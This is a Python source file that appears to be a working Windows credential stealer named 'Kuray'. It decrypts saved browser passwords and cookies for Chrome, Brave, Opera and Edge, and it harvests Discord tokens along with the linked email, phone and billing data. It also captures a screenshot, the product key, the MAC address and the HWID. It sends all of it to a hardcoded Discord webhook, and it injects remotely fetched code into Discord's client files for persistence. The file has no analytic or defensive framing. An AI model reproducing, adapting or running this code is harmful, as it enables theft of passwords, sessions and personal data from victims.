import requests
import os 
import win32crypt 
import shutil 
import sqlite3 
import zipfile 
import json 
import base64 
import psutil 
import pyautogui

from re import findall
from datetime import datetime
from Crypto.Cipher import AES

#

import os, subprocess, winreg, ctypes
from requests import get
from getpass import getuser
from socket import gethostname
from platform import uname
from uuid import getnode
from json import dumps, loads
from sqlite3 import connect
from wmi import WMI
from base64 import b64decode
from win32crypt import CryptUnprotectData
from tempfile import gettempdir
from re import split, findall
from shutil import disk_usage, copy2
from psutil import cpu_count, virtual_memory
from Crypto.Cipher import AES
from urllib.request import Request, urlopen
from discord import Webhook, RequestsWebhookAdapter
from discord_webhook import DiscordWebhook, DiscordEmbed
from subprocess import Popen, PIPE

##

import re, os
if os.name != "nt":
    exit()
from re import findall
import json
import platform as plt
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv

##

class kuray:
    def __init__(self):
        self.webhook = "https://canary.discord.com/api/webhooks/926220806198034442/eqaDJjLEoE35pqb-hxJMDSuaLadCtVfZUAhuQ4cvgPYxO8KYcLFko5gCMbVIeGWpJ0Ey"
        self.files = ""
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.tempfolder = os.getenv("temp")+"\\Kuray"

        try:
            os.mkdir(os.path.join(self.tempfolder))
        except:
            pass

        self.tokens = []
        self.saved = []

        if not os.path.exists(self.appdata+'\\Google'):
            self.files += f"**{os.getlogin()}** No tiene Google instalado\n"
        else:
            self.grabPassword()
            self.grabCookies()
        self.grabTokens()
        self.screenshot()
        self.SendInfo()
        self.LogOut()
        shutil.rmtree(self.tempfolder)

    def getheaders(self, token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    def LogOut(self):
        for proc in psutil.process_iter():
            if any(procstr in proc.name() for procstr in\
            ['discord', 'Discord', 'DISCORD']):
                proc.kill()
        for root, dirs, files in os.walk(os.getenv("LOCALAPPDATA")):
            for name in dirs:
                if "discord_desktop_core-" in name:
                    try:
                        directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Kuray"))
                    except FileNotFoundError:
                        pass
                    f = requests.get("https://raw.githubusercontent.com/91kfaisf9a/protectme/main/protection").text.replace(" ", self.webhook)
                    with open(directory_list, 'w', encoding="utf-8") as index_file:
                        index_file.write(f)
        for root, dirs, files in os.walk(os.getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
            for name in files:
                discord_file = os.path.join(root, name)
                os.startfile(discord_file)

    def get_master_key(self):
        with open(self.appdata+'\\Google\\Chrome\\User Data\\Local State', "r") as f:
            local_state = f.read()
        local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    
    def decrypt_payload(self, cipher, payload):
        return cipher.decrypt(payload)
    
    def generate_cipher(self, aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)
    
    def decrypt_password(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = self.generate_cipher(master_key, iv)
            decrypted_pass = self.decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:
            return "Chrome < 80"
    
    def grabPassword(self):
        master_key = self.get_master_key()
        f = open (self.tempfolder+"\\Google Passwords.txt", "w+")
        f.write("Code by Kent\n\n")
        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
        try:
            shutil.copy2(login_db, "Loginvault.db")
        except FileNotFoundError:
            pass
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = self.decrypt_password(encrypted_password, master_key)
                if url != "":
                    f.write(f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
        except:
            pass
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except:
            pass


    def grabCookies(self):
        master_key = self.get_master_key()
        f = open (self.tempfolder+"\\Google Cookies.txt", "w+")
        f.write("Code by Kent\n\n")
        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\cookies'
        try:
            shutil.copy2(login_db, "Loginvault.db")
        except FileNotFoundError:
            pass
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT host_key, name, encrypted_value from cookies")
            for r in cursor.fetchall():
                Host = r[0]
                user = r[1]
                encrypted_cookie = r[2]
                decrypted_cookie = self.decrypt_password(encrypted_cookie, master_key)
                if Host != "":
                    f.write(f"Host: {Host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
        except:
            pass
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except:
            pass

    def grabTokens(self):
        f = open(self.tempfolder+"\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
        f.write("KURAY STEALED TOKENS\n\n")
        paths = {
            'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for source, path in paths.items():
            if not os.path.exists(path):
                continue
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in findall(regex, line):
                            self.tokens.append(token)
        for token in self.tokens:
            r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
            if r.status_code == 200:
                if token in self.saved:
                    continue
                self.saved.append(token)
                j = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token)).json()
                badges = ""
                flags = j['flags']
                if (flags == 1):
                    badges += "Staff, "
                if (flags == 2):
                    badges += "Partner, "
                if (flags == 4):
                    badges += "Hypesquad Event, "
                if (flags == 8):
                    badges += "Green Bughunter, "
                if (flags == 64):
                    badges += "Hypesquad Bravery, "
                if (flags == 128):
                    badges += "HypeSquad Brillance, "
                if (flags == 256):
                    badges += "HypeSquad Balance, "
                if (flags == 512):
                    badges += "Early Supporter, "
                if (flags == 16384):
                    badges += "Gold BugHunter, "
                if (flags == 131072):
                    badges += "Verified Bot Developer, "
                if (badges == ""):
                    badges = "None"

                connections = (requests.get("https://discordapp.com/api/v9/users/@me/connections", headers=self.getheaders(token)).text).replace("[", "").replace("]", "").replace("{", "").replace("}", "").replace('"', "").replace(",", " /")
                if not connections:
                       connections = "There are no linked accounts"
                user = j["username"] + "#" + str(j["discriminator"])
                email = j["email"]
                phone = j["phone"] if j["phone"] else "No Phone Number attached"
                creation_date = datetime.fromtimestamp(((int(j["id"]) >> 22) + 1420070400000) / 1000).strftime("%d-%m-%Y %H:%M:%S")

                url = f'https://cdn.discordapp.com/avatars/{j["id"]}/{j["avatar"]}.gif'
                try:
                    requests.get(url)
                except:
                    url = url[:-4]

                nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=self.getheaders(token)).json()
                has_nitro = False
                has_nitro = bool(len(nitro_data) > 0)

                billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
                
                f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n[Avatar]({url})\n\n Connections: \n{connections}\n Acc date: {creation_date}")
        f.close()

    def screenshot(self):
        image = pyautogui.screenshot()
        image.save(self.tempfolder + "\\Screenshot.png")

    def SendInfo(self):
        try:
            data = requests.get("http://ipinfo.io/json").json()
            ip = data['ip']
            city = data['city']
            country = data['country']
            region = data['region']
            googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
        except:
            pass

        temp = os.path.join(self.tempfolder)
        new = os.path.join(self.appdata, f'Infected Data: [{os.getlogin()}].zip')
        self.zip(temp, new)
        for dirname, _, files in os.walk(self.tempfolder):
            for f in files:
                self.files += f"\n{f}"
        n = 0
        for r, d, files in os.walk(self.tempfolder):
            n+= len(files)
            self.fileCount = f"{n} Files Found: "

        for token in self.tokens:
            r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
            if r.status_code == 200:
                if token in self.saved:
                    continue
                self.saved.append(token)
       
        embed = {
            "avatar_url":"https://media.discordapp.net/attachments/914647494019919872/918977906787618866/kuray2.png",
            "embeds": [
                {
                    "author": {
                        "name": "Kuray",
                        "url": "https://kuray.xyz/",
                        "icon_url": "https://media.discordapp.net/attachments/914647494019919872/918977906787618866/kuray2.png"
                    },
                    "description": f"**DEVIL INFECTED\n```fix\nComputerName: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}\n```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
                    "color": 16119101,

                    "thumbnail": {
                      "url": "https://media.discordapp.net/attachments/914647494019919872/918977906787618866/kuray2.png"
                    },       

                    "footer": {
                      "text": "Code by Kent"
                    }
                    
                }
            ]
        }
        requests.post(self.webhook, json=embed)
        requests.post(self.webhook, files={'upload_file': open(new,'rb')})


    def zip(self, src, dst):
        zipped_file = zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED)
        abs_src = os.path.abspath(src)
        for dirname, _, files in os.walk(src):
            for filename in files:
                absname = os.path.abspath(os.path.join(dirname, filename))
                arcname = absname[len(abs_src) + 1:]
                zipped_file.write(absname, arcname)
        zipped_file.close()

#######################################################################
#DISCORD WEBHOOK#
#######################################################################
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)
def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)
def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        print(str(e))
def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor

WEBHOOK_URL = "https://canary.discord.com/api/webhooks/926220806198034442/eqaDJjLEoE35pqb-hxJMDSuaLadCtVfZUAhuQ4cvgPYxO8KYcLFko5gCMbVIeGWpJ0Ey" 
webhook = Webhook.from_url(WEBHOOK_URL, adapter=RequestsWebhookAdapter()) 
ip = get('https://api.ipify.org').text
mac = getnode()
mac_address = ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
username = getuser()
hostname = gethostname()
uname = uname()
svmem = virtual_memory()
webhookembed = DiscordWebhook(url=WEBHOOK_URL)
total, used, free = disk_usage("/")
temp = gettempdir()

#######################################################################
#CHROME BROWSER
#######################################################################
try:
    def get_master_key():
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = loads(local_state)
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]  # removing DPAPI
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
    copy2(login_db, temp+"\Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
    conn = connect(temp+"\Loginvault.db")
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            with open(temp+"\GooglePasswords.txt","a") as f:
                f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
                f.close()
        with open(temp+"\GooglePasswords.txt", "rb") as f:
            webhookembed.add_file(file=f.read(), filename='GooglePasswords.txt')
    except Exception as e:
        pass
    cursor.close()
    conn.close()
    try:
        os.remove(temp+"\Loginvault.db")
    except Exception as e:
        pass
except FileNotFoundError as e:
    webhook.send(f"```USER HAS NOT INSTALLED GOOGLE CHROME OR NO DATA!\n{e}```")
#######################################################################
#BRAVE BROWSER
#######################################################################
try:
    def get_master_key():
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = loads(local_state)
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]  # removing DPAPI
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\default\Login Data'
    copy2(login_db, temp+"\Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
    conn = connect(temp+"\Loginvault.db")
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            with open(temp+"\BravePasswords.txt","a") as f:
                f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
                f.close()
        with open(temp+"\BravePasswords.txt", "rb") as f:
            webhookembed.add_file(file=f.read(), filename='BravePasswords.txt')
    except Exception as e:
        pass
    cursor.close()
    conn.close()
    try:
        os.remove(temp+"\Loginvault.db")
    except Exception as e:
        pass
except FileNotFoundError as e:
    webhook.send(f"```USER HAS NOT INSTALLED BRAVE BROWSER OR NO DATA!\n{e}```")
#######################################################################
#OPERA BROWSER
#######################################################################
try:
    def get_master_key():
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera GX Stable\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = loads(local_state)
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]  # removing DPAPI
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera GX Stable\Login Data'
    copy2(login_db, temp+"\Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
    conn = connect(temp+"\Loginvault.db")
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            with open(temp+"\OperaPasswords.txt","a") as f:
                f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
                f.close()
        with open(temp+"\OperaPasswords.txt", "rb") as f:
            webhookembed.add_file(file=f.read(), filename='OperaPasswords.txt')
    except Exception as e:
        pass
    cursor.close()
    conn.close()
    try:
        os.remove(temp+"\Loginvault.db")
    except Exception as e:
        pass
except FileNotFoundError as e:
    webhook.send(f"```USER HAS NOT INSTALLED OPERAGX OR NO DATA!\n{e}```")
    pass
#######################################################################
#MICROSOFT EDGE
#######################################################################
try:
    def get_master_key():
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = loads(local_state)
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]  # removing DPAPI
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
    copy2(login_db, temp+"\Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
    conn = connect(temp+"\Loginvault.db")
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            with open(temp+"\EdgePasswords.txt","a") as f:
                f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
                f.close()
        with open(temp+"\EdgePasswords.txt", "rb") as f:
            webhookembed.add_file(file=f.read(), filename='EdgePasswords.txt')
    except Exception as e:
        pass
    cursor.close()
    conn.close()
    try:
        os.remove(temp+"\Loginvault.db")
    except Exception as e:
        pass
except FileNotFoundError as e:
    webhook.send(f"```USER HAS NOT INSTALLED MICROSOFT EDGE OR NO DATA!\n{e}```")

#######################################################################
#STEAL DISCORD TOKENS
#######################################################################
try:
    PING_ME = True
    def find_tokens(path):
        path += '\\Local Storage\\leveldb'
        tokens = []
        try:
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue

                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in findall(regex, line):
                            tokens.append(token)
        except FileNotFoundError:
            pass

        return tokens

    def main():
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')
        paths = {
            'Discord': roaming + '\\Discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Discord PTB': roaming + '\\discordptb',
            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
        }
        message = '@everyone' if PING_ME else ''
        for platform, path in paths.items():
            if not os.path.exists(path):
                continue

            message += f'\n**{platform}**\n```\n'
            tokens = find_tokens(path)
            if len(tokens) > 0:
                for token in tokens:
                    message += f'{token}\n'
            else:
                message += 'No tokens found.\n'
            message += '```'

        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
        }
        payload = dumps({'content': message})
        try:
            req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
            urlopen(req)
        except:
            pass
    main()
except Exception:
    webhook.send(f"```NO SE PUEDE OBTENER EL TOKEN DE DISCORD, EL DISCORD PUEDE NO ESTAR INSTALADO!\n{e}```")    
#######################################################################
#STEAL WINDOWS PRODUCT KEYS
#######################################################################
try:
    def decode_key(rpk):
        rpkOffset = 52
        i = 28
        szPossibleChars = "BCDFGHJKMPQRTVWXY2346789"
        szProductKey = ""

        while i >= 0:
            dwAccumulator = 0
            j = 14
            while j >= 0:
                dwAccumulator = dwAccumulator * 256
                d = rpk[j + rpkOffset]
                if isinstance(d, str):
                    d = ord(d)
                dwAccumulator = d + dwAccumulator
                rpk[j + rpkOffset] = int(dwAccumulator / 24) if int(dwAccumulator / 24) <= 255 else 255
                dwAccumulator = dwAccumulator % 24
                j = j - 1
            i = i - 1
            szProductKey = szPossibleChars[dwAccumulator] + szProductKey

            if ((29 - i) % 6) == 0 and i != -1:
                i = i - 1
                szProductKey = "-" + szProductKey
        return szProductKey

    def get_key_from_reg_location(key, value='DigitalProductID'):
        arch_keys = [0, winreg.KEY_WOW64_32KEY, winreg.KEY_WOW64_64KEY]
        for arch in arch_keys:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_READ | arch)
                value, type = winreg.QueryValueEx(key, value)
                # Return the first match
                return decode_key(list(value))
            except (FileNotFoundError, TypeError) as e:
                pass

    def get_windows_product_key_from_reg():
        return get_key_from_reg_location('SOFTWARE\Microsoft\Windows NT\CurrentVersion')


    def get_windows_product_key_from_wmi():
        w = WMI()
        try:
            product_key = w.softwarelicensingservice()[0].OA3xOriginalProductKey
            if product_key != '':
                return product_key
            else:
                return None
        except AttributeError:
            return None
except Exception as e:
    webhook.send(f"```CAN'T GET THE WINDOWS PRODUCT KEY!\n{e}```")

#######################################################################
#ADMIN CHECK
#######################################################################
if ctypes.windll.shell32.IsUserAnAdmin() != 0:
    admin = "True"
else:
    admin = "False"

#######################################################################
#GET HWID 
#######################################################################
p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE) 
hwid = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1].strip("  \r\r")

#######################################################################
#SEND THE DATA
#######################################################################
if __name__ == '__main__':

    embed = DiscordEmbed(title='Informacion Extra')
    embed.set_footer(text='Kent Development')
    embed.set_timestamp()
    embed.add_embed_field(name='**INFO DEL SISTEMA**', value=f'Username: {username}\nAdmin: {admin}\nKey from WMI: {get_windows_product_key_from_wmi()}\nKey from REG: {get_windows_product_key_from_reg()}')
    embed.add_embed_field(name='**OTRA INFO**', value=f"MAC Address: {mac_address}\n")
    embed.add_embed_field(name='HWID', value=f"{hwid}\n")

    webhookembed.add_embed(embed)
    response = webhookembed.execute()


#######WEB######

os.system("")

if __name__ == "__main__":
    kuray()
